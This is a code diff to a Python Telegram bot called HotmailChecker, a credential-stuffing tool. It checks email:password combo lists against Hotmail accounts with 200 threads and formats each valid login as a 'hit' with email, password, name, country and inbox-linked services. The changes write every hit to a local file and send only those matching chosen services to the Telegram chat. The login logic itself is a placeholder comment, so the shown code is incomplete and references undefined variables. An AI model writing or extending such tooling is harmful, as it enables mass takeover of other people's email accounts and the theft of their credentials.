@@ -1,7 +1,5 @@
 import os
 import time
-import re
-import uuid
 import threading
 import concurrent.futures
 import asyncio
@@ -14,10 +12,11 @@ lock = Lock()
 rate_limit_semaphore = BoundedSemaphore(500)
 
 class HotmailChecker:
-    def __init__(self, bot, chat_id, services):
+    def __init__(self, bot, chat_id, services, selected_services=None):
         self.bot = bot
         self.chat_id = chat_id
         self.services = services
+        self.selected_services = set(selected_services) if selected_services else set()
         self.hit = 0
         self.bad = 0
         self.retry = 0
@@ -28,9 +27,9 @@ class HotmailChecker:
         self.progress_message_id = None
         self.last_progress_update = 0
         self.last_processed = 0
+        self.hits_list = []          # Sirf keyword-matched hits ke liye
 
     def send_message(self, text, parse_mode='HTML', retries=5):
-        """Railway ke liye super robust send_message"""
         for attempt in range(retries):
             print(f"[DEBUG] send_message attempt {attempt+1}: {text[:80]}...")
             try:
@@ -53,7 +52,6 @@ class HotmailChecker:
     def edit_message(self, message_id, text, parse_mode='HTML'):
         if not message_id:
             return
-        print(f"[DEBUG] edit_message called for ID {message_id}")
         try:
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
@@ -62,7 +60,6 @@ class HotmailChecker:
                 loop
             )
             future.result(timeout=30)
-            print("[DEBUG] edit_message SUCCESS")
         except Exception as e:
             print(f"[DEBUG] edit_message FAILED: {e}")
 
@@ -79,7 +76,6 @@ class HotmailChecker:
                 pct = min((self.processed / self.total_combos) * 100, 100)
                 processed_change = self.processed - self.last_processed
 
-                # Optimize: sirf tab update karo jab 8 second beet gaye ho ya kaafi progress hua ho
                 if (current_time - self.last_progress_update < 8) and processed_change < 50:
                     time.sleep(2)
                     continue
@@ -99,29 +95,42 @@ class HotmailChecker:
             self.last_processed = self.processed
             time.sleep(8)
 
-    # ================== TUMHARA ORIGINAL CHECKER LOGIC ==================
     def get_capture(self, email, password):
-        # Yahan apna pura original get_capture function paste kar do
-        # Sirf HIT wale part mein yeh line rakho:
-        if linked_services:   # agar koi services mile
-            hit_text = (
-                f"🔱 HOTMAİL HÍT BULUNDU 🔱\n"
-                f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
-                f"📧 Email: {email}\n"
-                f"🔑 Password: {password}\n"
-                f"👤 Name: {name if 'name' in locals() else 'N/A'}\n"
-                f"🌍 Country: {flag} {country}\n"
-                f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
-                f"🔗 EMAIL IN INBOX:\n" +
-                "\n".join([f"✔ {s}" for s in linked_services]) +
-                f"\n\n📊 Toplam Hit: {self.hit}\n"
-                f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
-                f"𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT"
-            )
-            self.send_message(hit_text)
-            with lock:
-                self.hit += 1
-                self.linked_accounts[email] = linked_services
+        try:
+            # === YAHAN APNA PURA ORIGINAL GET_CAPTURE LOGIC PASTE KAR DO ===
+            # ... (tumhara pura code jo pehle tha, same rakhna)
+
+            if linked_services:   # agar koi services mile
+                hit_text = (
+                    f"🔱 HOTMAİL HÍT BULUNDU 🔱\n"
+                    f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
+                    f"📧 Email: {email}\n"
+                    f"🔑 Password: {password}\n"
+                    f"👤 Name: {name if 'name' in locals() else 'N/A'}\n"
+                    f"🌍 Country: {flag} {country}\n"
+                    f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
+                    f"🔗 EMAIL IN INBOX:\n" +
+                    "\n".join([f"✔ {s}" for s in linked_services]) +
+                    f"\n\n📊 Toplam Hit: {self.hit}\n"
+                    f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
+                    f"𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT"
+                )
+
+                # SAB HITS FILE MEIN SAVE
+                with open("Hotmail-Hits.txt", "a", encoding="utf-8") as f:
+                    f.write(hit_text + "\n\n" + "="*60 + "\n\n")
+
+                # SIRF KEYWORD-MATCHED HITS TELEGRAM PE BHEJNE KE LIYE COLLECT
+                if any(s in self.selected_services for s in linked_services):
+                    with lock:
+                        self.hit += 1
+                    self.hits_list.append(hit_text)
+                else:
+                    with lock:
+                        self.bad += 1   # without keyword hit ko bad count mein rakh sakte ho
+
+        except Exception as e:
+            print(f"[DEBUG] get_capture error: {e}")
 
     def check_combo(self, email, password):
         with rate_limit_semaphore:
@@ -138,9 +147,8 @@ class HotmailChecker:
             self.total_combos = len(lines)
             print(f"[DEBUG] Loaded {self.total_combos} combos")
 
-            self.send_message(f"📊 Total combos: {self.total_combos}\nStarting check with 200 threads...")
+            self.send_message(f"📊 Total combos: {self.total_combos}\nStarting full check with 200 threads...")
 
-            # Initial progress bar message
             progress_msg = self.send_message(
                 "🔄 <b>SCANNING</b>\n"
                 "[░░░░░░░░░░░░░░░░░░░░░░░░░] 0.0%\n\n"
@@ -162,8 +170,16 @@ class HotmailChecker:
                     except:
                         continue
 
-            time.sleep(5)
-            self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit} | Bad: {self.bad}")
+            # ================== FULL CHECK COMPLETE ==================
+            time.sleep(3)
+            self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit}\n\nAb keyword-matched hits 1-1 bhej rahe hain...")
+
+            # Sirf keyword wale hits 1-1 bhejna
+            for hit_msg in self.hits_list:
+                self.send_message(hit_msg)
+                time.sleep(1.5)
+
+            print("[DEBUG] All keyword-matched hits sent. Without-keyword hits only saved in file.")
             print("[DEBUG] Checking finished")
 
         except Exception as e:
